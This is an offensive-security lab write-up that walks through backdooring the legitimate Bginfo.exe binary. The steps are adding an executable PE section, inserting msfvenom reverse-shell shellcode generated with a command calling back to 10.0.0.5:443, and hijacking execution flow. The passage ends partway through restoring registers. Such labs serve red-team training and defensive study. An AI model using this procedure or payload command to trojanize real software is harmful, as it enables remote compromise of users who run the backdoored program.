# Backdooring PE Files with Shellcode
*The purpose of this lab is to learn the Portable Executable (PE) backdooring technique by adding a new readable/writable/executable code section with our malicious shellcode to any portable executable file.*

*High level process of this technique:*

*-Add a new RWX PE section, big enough to hold our shellcode, to any .exe file*  
*-Generate shellcode*  
*-Add shellcode to the newly created PE section*  
*-Redirect execution flow of the .exe file being backdoored to the shellcode*  
*-Redirect execution flow back to the legitimate .exe instructions*  

# Generate Shellcode
*First of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:*

```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```  
![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)  
*Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.*

# New PE Code Section
*I randomly chose Bginfo.exe from sysinternals as a binary to be backdoored. Let's add a new PE section called  that will contain our shellcode - note the size is 200h bytes, so plenty for our shellcode which was only 324 bytes:*```.code1```

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/cbd3afd7-743d-4fb5-8229-f9e1e603967a)

*Note the Raw Address of the new section which is CD200 - this is where we will place the shellcode inside the file in later steps.*

*Let's make the new PE section writable/executable and mark it as  using CFF Explorer:*```contains code```

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/716391fe-41a2-4726-8d45-cda36285d1f8)

# Inserting Shellcode
*Let's copy the shellcode over to the new code section, starting at 0xCD200 into the file:*

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/a758cb03-9b26-49d3-8ec2-d90381932539)

# Testing the Shellcode
*Let's see if we can force the Bginfo.exe binary to execute our shellcode using debugger first. We need to find the base address of Bginfo.exe, which we see is 0x00400000:*

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/507dae91-e32c-4b2e-a1af-40da1979b3d4)

*Since the new section .code1 that holds our shellcode has an RVA 000D8000, we can find the shellcode in a running process at 00400000+00d8000 = ‭4D8000‬. Below shows that the bytes at cd200 (file offset) match those at 4d8000 while the bginfo.exe is running:*

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/d2a3b0a1-3a05-46dc-bddd-27901d1f548b)

*When debugging the binary, if we set the EIP to point to 4D8000‬ and let the debugger run, if we have a listener on the attacking system, we get the reverse shell which confirms that we can successfully execute the shellcode if we manage to redirect the code execution flow of bginfo.exe:*

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/d44f53e6-c25d-4a24-a435-a995e5b17d8d)

## i
*In the above screenshot,  and  are the first instructions at 4d8000 - it's not shown in this lab how those two instructions were inserted there, but there is no magic  - just add   bytes  before the shellcode at 0xCD200 in the bginfo and you're set.* ```pushad pushdf 60 9c```

# Redirecting Code Execution Flow
*In previous paragraph we confirmed the shellcode can be executed, but we did this manually, with help of a debugger. Now let's patch the binary, so that the process is automated and does not require our intervention.*

*The process of patching the binary to redirect the code execution flow is as follows:*

*1. Find the first instruction that is 5 bytes in size inside the bginfo.exe binary*  
*1.1 We will overwrite this instruction with a jump to the shellcode as explained in step 2*  
*1.2 Prior to overwriting this instruction, write it down somewhere - we will need to append it to our shellcode later in order to restore the code   execution flow*  
*1.3 Write down the address of the next instruction to be executed next - after the shellcode has been executed, stack and registers restored, we will jump back to this address to let the bginfo.exe continue as normal*  

*2. Overwrite the instruction in step 1 with a jump to the shellcode at 4D8000‬*  

*3. Save registers' and flags' state by prepending the shellcode with ```pushad``` and ```pushfd``` instructions - we do this so we can restore their state before redirecting the execution back to bginfo.exe and avoid any crashes*  

*4. Remember the ESP register value - we will need this when calculating by how much the stack size grew during the shellcode execution. This is required in order to restore the stack frame before redirecting the code execution back to bginfo.exe*

*5. Modify the shellcode:*  
*5.1 Make sure that ```WaitForSingleObject``` does not wait indefinitely and does not freeze bginfo.exe once the shellcode is executed*  
*5.2 Remove the last instruction of the shellcode ```call ebp``` to prevent the shellcode from shutting down of bginfo.exe*

*6. Note the ESP value and the end of shellcode execution - this is related to point 4 and 7*

*7. Restore the stack pointer ESP to what it was after the shellcode executed ```pushad``` and ```pushfd``` as explained in step 3, with . This is where ESPs from point 4 and 7 comes in to play*```add esp, <ESP_POST_SHELLCODE - ESP_PRE_SHELLCODE>```

*8. Restore registers with ```popfd``` and ```popad```*








